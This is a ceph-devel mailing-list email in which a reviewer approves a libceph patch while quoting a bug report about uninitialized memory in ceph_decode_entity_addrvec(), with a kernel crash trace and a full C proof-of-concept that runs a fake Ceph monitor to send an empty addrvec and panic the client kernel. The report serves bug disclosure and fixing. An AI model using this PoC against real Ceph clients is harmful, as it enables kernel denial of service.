Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7B7B23D6CB8
	for <ceph-devel@vger.kernel.org>; Tue, 30 Jun 2026 18:45:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=170.10.129.124
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782845121; cv=pass; b=GliYrwEnwUxU6vflK1qwHypa5M9IDG1spjug8HL3nHS5/Q5nbfCKSPN59AQM1tUt/0CP9FobRH9dvrv15K/QuL3oNQ/e8Xz6Jx3nfcgXDI8wYBfBy+udV7SsmQ4EBKAICb1xP3CWQykr21VtCxLoPDrRwWJIMcbfFlMrEX01LjI=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782845121; c=relaxed/simple;
	bh=wpMfHHJSCQ3Lo84Qk4UY5zkTPrDCeN3utECwu4L9B/8=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=i4gVakXwPgc5J4Z7m6LuVmUeWMMNidqmcODSUiJ9QVfDtfSqv/FrI3VRhAM8PeiWz0Q2R18xux6sS7M5CZlxCcCdZiBPfslStzkRKBN+5YvUB/3eSKqltaF2PEREkEgZnZzI5VWDEZ+0x5Wg8mp/Jndu/rHUIj7di+pA52cMC3Q=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=BTIRE3PS; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=S8FmfVc0; arc=pass smtp.client-ip=170.10.129.124
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="BTIRE3PS";
	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="S8FmfVc0"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1782845118;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=psr+Le47bJbCtRwpW6rHKlQewYERubo8VJGv5+P8Au8=;
	b=BTIRE3PSnkzQ850Bl1ByOnUTPOL6r7oNSopg2bEprN9vQL+WS1tTcpDY2ynA+16oRiTSAZ
	wxKgZI5YwtyIxjDcLnaXCt7ppdeez7gjFgTaVJyX3G8l80HSRKWjLvDXeK+QP3oDC9dUi6
	sEEo0YjMgs3ESOqRKZwGHjp96bax8F0=
Received: from mail-qt1-f200.google.com (mail-qt1-f200.google.com
 [209.85.160.200]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
 us-mta-631-pm74X3mcM6Kdsf5djI6oBw-1; Tue, 30 Jun 2026 14:45:16 -0400
X-MC-Unique: pm74X3mcM6Kdsf5djI6oBw-1
X-Mimecast-MFC-AGG-ID: pm74X3mcM6Kdsf5djI6oBw_1782845116
Received: by mail-qt1-f200.google.com with SMTP id d75a77b69052e-51c1e6f602cso5829041cf.3
        for <ceph-devel@vger.kernel.org>; Tue, 30 Jun 2026 11:45:16 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1782845116; cv=none;
        d=google.com; s=arc-20260327;
        b=ZLzT+LiTLyKFoFHp7nC6IC0EQ46hiJgZhSc9Kd+g+cZzvngJZ2Ch+GLcspwYeTuFop
         rMURXn639zUcYWPh7i1Q3r0SjmfBp0iyGT8qk7QalnwCdL//J3WqUPUwjGkX0yvvEKZf
         Tzz51uJm4l7MXKdMzXqqI//NFSoelgQH5CWbLQPVxB9jDh26b2zctwp7m6dzvFm9Pxf9
         CTT1GDkua/+IV6fOLNVJelZtrVS3P5k7VG4QSXhkQinvqLIdh3U87EJcZuupr3aKP9eI
         0L/0PyHONTjxnwNRbGEO9RHa2ujntWUu5ccAU1a0jfIWgZfYiNeLsvHMbDZuuODWYZq4
         YlYQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=psr+Le47bJbCtRwpW6rHKlQewYERubo8VJGv5+P8Au8=;
        fh=u/ewT8WIvA9D++SeM3z/ItdOs63U0I7bD62uPCKeWTA=;
        b=kjq2MYgEjQnMKeWtsy19Gcfzq6ZFejbntd/ZxDPgUKIcMHBJ3OtgmZSsvSykUcR8ke
         c5LLKR+MwcrRH0n/NISOncDQCcXCTkd48m1CJkEYRVsgQVqjWnUcXdt3c7w7tJsbYg9n
         HGD8BAEPZKgap9D90jGHr9b7VDsHAqka9wTjLY+vz5u4Y9YCtapVxUUGvmiIS3FXYHbS
         fhAEoEBvSpRGzSvzsVhBrcVnroJi/cERWKhLB2+H/TyRKH/ABvJpmyhFEM/lF1FltwpS
         d5hbKh8uEwGc0jzk/EVvdpi+VW8FJFCT8Bb4nidIv0ctlYzspwINd9Fr6B8RWHEts+Am
         ja7g==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=redhat.com; s=google; t=1782845116; x=1783449916; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=psr+Le47bJbCtRwpW6rHKlQewYERubo8VJGv5+P8Au8=;
        b=S8FmfVc0jCguc9GF6at0Nn4EaooGXwnorhPG1RpI9wsmSTcSpLvUqRJVI2D2yFXV1z
         QljLhpcJ6MeEHsaEvooZjm5Ghmf6vmQkxKn9wD9VAzrsJH1ZOhAopn/rlMV8YpPHglPB
         QLPP/YBERmZ2DH3a44mQF56gFcLIzYd14pyUy26rqc/TjVCLoqItsisoyd4d6O52d/ab
         I8cwllqE3OkaQGstBA1aFCHkuM6/LqJ/Lziqmgjy1H0MXOhdEWyJxb1I2IYbvcLtxsTT
         E/1/bLu5R53hKuLQiFMS+EkCpNRIRbJ6HDqAV4yWYaRF6OPRkmYFYRM13hA8vfJS+ubN
         H/IQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1782845116; x=1783449916;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=psr+Le47bJbCtRwpW6rHKlQewYERubo8VJGv5+P8Au8=;
        b=KJ+SyeYQxF0sqHptIT4zGEX4rSP5T6yx8H7rU76LMmMxEFlt2+pJeIRRrxc0dgph6F
         FwOkGboe0fY7vfFTWPlyQBC07ujumxq/9DiYVScbmpTxPdCfdb2CLoUmZmy2f2SrmW8G
         zx9nc8ECG5F2ll3+A5E23vdJ2zGXulTJtgjoHxIqlcJfgDcWT1H5XLObZIQpm26znB7q
         1TaAcHS9rTTp8lP2GFPKcX0ym7pWrvHq/XRvo4i2QNMDGmPrQCFD/iRUK5PvgEIS66xG
         nUKytEHLidhJNUjlRwtruIa1S4XGeRErsOVYtVVRdpWP+nr4NpHo1uesJ7xg9t7RiHms
         iRtA==
X-Forwarded-Encrypted: i=1; AFNElJ/3Ekdy0z76oAcI7wGAw0DikihjJOVlllexEkHfXHJ+m1C7eeJmFj5Oi00fUXKzAwKS0y9cTOrTBfHz@vger.kernel.org
X-Gm-Message-State: AOJu0YzjmqlBorO5lC4f+t3H35cinFuuLrqM/DTC8SpmVL0K+V+GvwrQ
	cN9uHtlgw/5kurham9UlUv1l9uIe+4dGi1Lv8ACkPO+Z45mABpYZzNh3+6h0RrSM312Wy+kV60U
	YIMZFn93LqNr8JGhPNy1Som8cRf4/jmYk9RFYhjJApbb83mfAYAakGaBKp/2jjDfIRVvMBQxv5q
	SqMpi9tmbtqUz4u1OcJ5fQHnywJAUPcxkUjPUZfSXdD/29Q495
X-Gm-Gg: AfdE7cm4UeI9nY9m/cntc7R4KwZFkVs2PjRECeqg6eD694AC+JbJHMmwxc+UiyjRpl5
	QD2EqkxVGnHT8+XZac6CCPm23p48OlZKnARxRzB45GmqrBamIzfOBxkLDfUkb4aLIpJ53lcAUCg
	RTPoqKYV+PA3B1POOMEq9JAtmgwJSzSRkV8/UQjPwsEFmaeLrD/WxY75BV8YskHsMo
X-Received: by 2002:ac8:590c:0:b0:51a:329:e802 with SMTP id d75a77b69052e-51c108b8187mr64587041cf.41.1782845115933;
        Tue, 30 Jun 2026 11:45:15 -0700 (PDT)
X-Received: by 2002:ac8:590c:0:b0:51a:329:e802 with SMTP id
 d75a77b69052e-51c108b8187mr64586581cf.41.1782845115384; Tue, 30 Jun 2026
 11:45:15 -0700 (PDT)
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260604140231.2759025-1-k.chai@proxmox.com> <20260611113251.2975975-1-k.chai@proxmox.com>
 <tencent_3A900D10F5E1841A0950F6CAA67897936D09@qq.com> <87echy650y.fsf@proxmox.com>
In-Reply-To: <87echy650y.fsf@proxmox.com>
From: Alex Markuze <amarkuze@redhat.com>
Date: Tue, 30 Jun 2026 21:45:02 +0300
X-Gm-Features: AVVi8Cd5V2NGEwmJEGOOzY2bvCDgFg9892lqvr7Rr6W2TSm5Jk1UNdS9YPadN6E
Message-ID: <CAO8a2Sjf2KFeA9Gm8Bs8jnhvokzR4c8AiB+1mo776FGdOZPG4Q@mail.gmail.com>
Subject: Re: [PATCH v3] libceph: tolerate addrvecs with multiple entries of
 the same type
To: Kefu Chai <k.chai@proxmox.com>
Cc: XIAO WU <xiaowu.417@qq.com>, ceph-devel@vger.kernel.org, 
	Ilya Dryomov <idryomov@gmail.com>, Viacheslav Dubeyko <slava@dubeyko.com>, linux-kernel@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

It looks good to me.
I'll ask
@Ilya Dryomov to see if still has comments.

On Mon, Jun 22, 2026 at 5:09=E2=80=AFPM Kefu Chai <k.chai@proxmox.com> wrot=
e:
>
> XIAO WU <xiaowu.417@qq.com> writes:
>
> > Hi Kefu,
> >
> > I came across a Sashiko AI code review [1] that flagged a pre-existing
> > uninitialized memory issue in `ceph_decode_entity_addrvec()`.  When the
> > addrvec has zero entries (`addr_cnt =3D=3D 0`), the function returns 0
> > without writing to `*addr`, but callers like `ceph_monmap_decode()`
> > pass addresses from `kmalloc_flex()` and proceed to use them.
> >
>
> hi Xiao,
>
> Thanks for the report and the reproducer. I can confirm it. But I'd
> prefer sending the fix separately rather than fold it into v3, as you
> pointed out it's pre-existing and independent of my patch.
>
> I took a look at the callers of `ceph_decode_entity_addrvec()`.
> Following caller suffers from this issue:
>
> - ceph_monmap_decode()         mon_inst[] from kmalloc_flex() (heap)
> - ceph_mdsmap_decode()         on-stack addr -> m_info[mds].addr
> - decode_new_up_state_weight() on-stack addr -> osd_addr[osd]
> - ProtocolV2 server_ident      on-stack addr, used in memcmp()
>
> osdmap_decode() is the one caller where an empty addrvec is *legitimate*,
> and the slot is pre-zeroed with osdmap_set_max_osd(), so it's safe.
>
> > I was able to reproduce this in QEMU by running a fake Ceph monitor tha=
t
> > sends a monmap with an empty addrvec.  With `panic_on_warn=3D1`, the
> > kernel hits a WARNING in `ceph_con_v1_try_read()` and panics.
> >
>
> For the commit message / changelog, I'd state the threat model: this
> needs a malformed or buggy peer, since legitimate daemons always
> advertise at least one addresss -- I checked the current ceph.git to
> verify this. But I agree that the connect-to-bogus-addr and panic you
> hit does have a concrete impact, as kernel should not panic on malformed
> input. this could happen over an unencrypted, signature-unchecked msgr
> v1 transport.
>
> For the fix, i'd avoid a defenseive memset() of *addr. as this reminds
> me a strncpy which always reset the dest str even if the source str's
> length is zero. So I think the right fix is probably to extend the
> semantic of `-ENOENT` returned by ceph_decode_entity_addrvec().
> Currently, this func returns `-ENOENT` to indicate that "the addrvec has
> entries, but none of them is of the wanted type". We can extend to
> apply to the emtpy addrvec, so it imply that "no addr of the requested
> type". This way, we only need to update osdmap_decode() so it tolerates
> -ENOENT.
>
> Ilya, does this direction look right?
>
> >
> > On Thu, Jun 11, 2026 at 07:32:51PM +0800, Kefu Chai wrote:
> >  > ceph_decode_entity_addrvec() currently rejects any addrvec containin=
g
> >  > more than one entry that matches the requested msgr type...
> >
> > Your patch correctly tolerates duplicate entries, but the function stil=
l
> > returns success without touching `*addr` when `addr_cnt =3D=3D 0`:
> >
> > ```c
> > // net/ceph/decode.c: ceph_decode_entity_addrvec()
> > if (!addr_cnt)
> >      return 0;  // *addr is still uninitialized
> > if (addr_cnt =3D=3D 1 && !memchr_inv(&tmp_addr, 0, sizeof(tmp_addr)))
> >      return 0;  // same
> > ```
> >
> > Callers that pass addresses from dynamic allocation hit stale data:
> >
> > ```c
> > // net/ceph/mon_client.c: ceph_monmap_decode()
> > mon_inst =3D kmalloc_flex(..., num_mon, sizeof(*mon_inst));
> > // ...
> > ceph_decode_entity_addrvec(p, end, msgr2, &mon_inst[i].addr);
> > // mon_inst[i].addr may be uninitialized if addrvec was empty
> > ```
> >
> > [Reproduction]
> >
> > I set up a fake Ceph v1 monitor on localhost that sends a monmap
> > containing a monitor entry with an empty addrvec (addr_cnt=3D0). Mounti=
ng
> > the Ceph filesystem against it triggers the monmap decode path, causing
> > the client to attempt a connection with the uninitialized address.
> >
> > [Crash =E2=80=94 kernel 7.1.0-rc6, panic_on_warn=3D1]
> >
> >    con->v1.connect_seq !=3D le32_to_cpu(con->v1.in_reply.connect_seq)
> >    WARNING: net/ceph/messenger_v1.c:901 at
> > ceph_con_v1_try_read+0x59f7/0x7020
> >
> >    RIP: 0010:ceph_con_v1_try_read+0x59f7/0x7020
> >    Call Trace:
> >     <TASK>
> >     ceph_con_workfn+0xa04/0x13c0
> >     process_one_work+0xa20/0x1c50
> >     worker_thread+0x6df/0xf30
> >     kthread+0x387/0x4a0
> >     ret_from_fork+0xb2c/0xdd0
> >     </TASK>
> >
> >    Kernel panic - not syncing: kernel: panic_on_warn set ...
> >
> > Full PoC source (poc.c):
> > ---8<----------------------------------------------------------------
> > /*
> >   * PoC: Uninitialized memory in ceph_decode_entity_addrvec()
> >   * Compile: gcc -static -o poc poc.c
> >   * Run: ./poc [port]
> >   */
> > #define _GNU_SOURCE
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <unistd.h>
> > #include <sys/socket.h>
> > #include <sys/mount.h>
> > #include <sys/wait.h>
> > #include <sys/stat.h>
> > #include <sys/poll.h>
> > #include <arpa/inet.h>
> > #include <netinet/in.h>
> > #include <stdint.h>
> > #include <errno.h>
> > #include <fcntl.h>
> >
> > #define BANNER "ceph v027"
> > #define BNR 9
> > #define ADR 136
> > #define CBNR (BNR+ADR)
> > #define SBNR (BNR+2*ADR)
> >
> > #define TAG_RDY 1
> > #define TAG_MSG 7
> > #define MON_MAP 4
> > #define ENT_MON 1
> >
> > #define MSZ 16384
> >
> > typedef uint8_t u8; typedef uint16_t u16;
> > typedef uint32_t u32; typedef uint64_t u64;
> >
> > static u32 ct[256];
> > static int ci;
> >
> > static void ic(void)
> > {
> >      u32 i, j, k;
> >      if (ci) return;
> >      for (i =3D 0; i < 256; i++) {
> >          k =3D i;
> >          for (j =3D 0; j < 8; j++)
> >              k =3D (k >> 1) ^ (k & 1 ? 0x82F63B78 : 0);
> >          ct[i] =3D k;
> >      }
> >      ci =3D 1;
> > }
> >
> > static u32 crc(u32 c, const u8 *b, int l)
> > {
> >      while (l--) c =3D ct[(c ^ *b++) & 0xFF] ^ (c >> 8);
> >      return c;
> > }
> >
> > #define W8(b,v)  ((b)[0] =3D (u8)(v))
> > #define W16(b,v) ((b)[0]=3D(v)&255,(b)[1]=3D((v)>>8)&255)
> > #define W32(b,v)
> > ((b)[0]=3D(v)&255,(b)[1]=3D((v)>>8)&255,(b)[2]=3D((v)>>16)&255,(b)[3]=
=3D((v)>>24)&255)
> > #define W64(b,v) do { int _i; for (_i=3D0; _i<8; _i++)
> > (b)[_i]=3D((u64)(v)>>(_i*8))&255; } while(0)
> >
> > #define REQ_FEAT (1ULL << 23)
> >
> > static int rcv(int f, u8 *b, int l)
> > {
> >      while (l > 0) {
> >          struct pollfd p =3D { .fd =3D f, .events =3D POLLIN };
> >          if (poll(&p, 1, 15000) <=3D 0) return -1;
> >          int n =3D read(f, b, l);
> >          if (n <=3D 0) return -1;
> >          b +=3D n; l -=3D n;
> >      }
> >      return 0;
> > }
> >
> > static int snd(int f, u8 *b, int l)
> > {
> >      while (l > 0) { int n =3D write(f, b, l); if (n <=3D 0) return -1;=
 b +=3D
> > n; l -=3D n; }
> >      return 0;
> > }
> >
> > static int ea(u8 *b) { W8(b, 2); W32(b+1, 0); return 5; }
> >
> > static int pay(u8 *b)
> > {
> >      int o =3D 0, bo, so, po, mo, ms;
> >      bo =3D o; W32(b+o, 0); o +=3D 4;
> >      W8(b+o, 6); o++; W8(b+o, 1); o++;
> >      so =3D o; W32(b+o, 0); o +=3D 4;
> >      po =3D o;
> >      W64(b+o, 0x42); o +=3D 8;
> >      W32(b+o, 1); o +=3D 4;
> >      W8(b+o, 1); o++; W8(b+o, 1); o++; W32(b+o, 0); o +=3D 4;
> >      W8(b+o, 1); o++; W8(b+o, 1); o++; W32(b+o, 0); o +=3D 4;
> >      W32(b+o, 1); o +=3D 4;
> >      W32(b+o, 2); o +=3D 4; memcpy(b+o, "m0", 2); o +=3D 2;
> >      W8(b+o, 1); o++; W8(b+o, 1); o++;
> >      mo =3D o; W32(b+o, 0); o +=3D 4;
> >      ms =3D o;
> >      W32(b+o, 2); o +=3D 4; memcpy(b+o, "m0", 2); o +=3D 2;
> >      o +=3D ea(b+o);
> >      W32(b+mo, o - ms);
> >      W32(b+so, o - po);
> >      W32(b+bo, o - bo);
> >      return o;
> > }
> >
> > #define HS 60
> > #define FS 13
> >
> > static int msg(u8 *b, u64 s)
> > {
> >      int o =3D 0;
> >      b[o++] =3D TAG_MSG;
> >      int h =3D o;
> >      memset(b+o, 0, HS); o +=3D HS;
> >      int pl =3D pay(b+o); o +=3D pl;
> >      memset(b+o, 0, FS); o +=3D FS;
> >      u8 *hh =3D b + h;
> >      W64(hh+0, s); W16(hh+16, MON_MAP); W16(hh+18, 127);
> >      W16(hh+20, 1); W32(hh+22, pl); W64(hh+36, ENT_MON);
> >      W64(hh+44, 0); W32(hh+56, crc(0, hh, 56));
> >      return o;
> > }
> >
> > static int mon(int pt)
> > {
> >      int s, c; struct sockaddr_in a; u8 b[MSZ];
> >      ic();
> >      s =3D socket(AF_INET, SOCK_STREAM, 0);
> >      int o =3D 1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o)=
);
> >      memset(&a, 0, sizeof(a)); a.sin_family =3D AF_INET;
> >      a.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK); a.sin_port =3D htons=
(pt);
> >      bind(s, (void *)&a, sizeof(a)); listen(s, 1);
> >      struct pollfd p =3D { .fd =3D s, .events =3D POLLIN };
> >      if (poll(&p, 1, 60000) <=3D 0) goto out;
> >      c =3D accept(s, 0, 0);
> >
> >      if (rcv(c, b, CBNR) < 0) goto done;
> >      { u8 *p =3D b; memcpy(p, BANNER, BNR); p +=3D BNR;
> >        memset(p, 0, ADR); p +=3D ADR; memset(p, 0, ADR);
> >        if (snd(c, b, SBNR) < 0) goto done; }
> >      { int t =3D 0; while (t < 26) {
> >          struct pollfd p2 =3D { .fd =3D c, .events =3D POLLIN };
> >          if (poll(&p2, 1, 10000) <=3D 0) goto done;
> >          int n =3D read(c, b+t, MSZ-t); if (n <=3D 0) goto done; t +=3D=
 n; } }
> >      memset(b, 0, 26); W8(b, TAG_RDY); W64(b+1, REQ_FEAT);
> >      snd(c, b, 26); usleep(300000);
> >      { int ml =3D msg(b, 1); snd(c, b, ml); }
> >      usleep(500000);
> >      { int ml =3D msg(b, 2); snd(c, b, ml); }
> > out:
> >      close(c); close(s); return 0;
> > done:
> >      close(c); close(s); return -1;
> > }
> >
> > int main(int ac, char **av)
> > {
> >      int pt =3D 16789; if (ac >=3D 2) pt =3D atoi(av[1]);
> >      pid_t pid =3D fork();
> >      if (pid =3D=3D 0) { mon(pt); _exit(0); }
> >      usleep(200000);
> >      mkdir("/tmp/mnt", 0700);
> >      char s[64]; snprintf(s, 64, "127.0.0.1:%d:/", pt);
> >      mount(s, "/tmp/mnt", "ceph", 0, "name=3Dadmin");
> >      waitpid(pid, 0, 0);
> >      umount2("/tmp/mnt", MNT_FORCE); rmdir("/tmp/mnt");
> >      return 0;
> > }
> > ---8<----------------------------------------------------------------
> > Compile: gcc -static -o poc poc.c
> >
> > [1]
> > https://sashiko.dev/#/patchset/20260611113251.2975975-1-k.chai%40proxmo=
x.com
> >      (Sashiko AI code review =E2=80=94 "Uninitialized Memory", Severity=
: High)
> >
> > Thanks,
> > XIAOWU
>

